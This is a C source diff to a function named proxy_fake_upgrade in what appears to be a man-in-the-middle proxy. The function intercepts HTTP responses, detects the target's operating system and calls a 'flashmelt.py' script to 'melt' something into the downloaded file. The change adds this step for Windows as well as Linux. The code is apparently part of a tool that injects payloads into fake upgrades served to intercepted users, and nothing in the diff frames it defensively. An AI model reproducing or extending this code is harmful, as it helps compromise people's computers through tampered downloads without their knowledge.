@@ -105,20 +105,17 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	 fbio = BIO_new(BIO_f_null());
          inject_len = 0;
       } else if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
+	 char *cmd_melt = NULL;
+
 	 switch (os) {
 	 case WINDOWS:
-	     DEBUG_MSG(D_INFO, "Windows detected");
+	     DEBUG_MSG(D_INFO, "Windows detected, melting...");
+	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
 	     break;
 
 	 case LINUX:
 	     DEBUG_MSG(D_INFO, "Linux detected, melting...");
-
-	     char *cmd_melt = NULL;
-
-	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py %s", file);
-	     ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
-	     system(cmd_melt);
-	     free(cmd_melt);
+	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
 	     break;
 
 	 case OSX:
@@ -127,6 +124,10 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	 case UNKNOWN:
 	     break;
 	 }
+
+	 ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
+         system(cmd_melt);
+         free(cmd_melt);
 
          DEBUG_MSG(D_INFO, "Substituting video frame...");
       
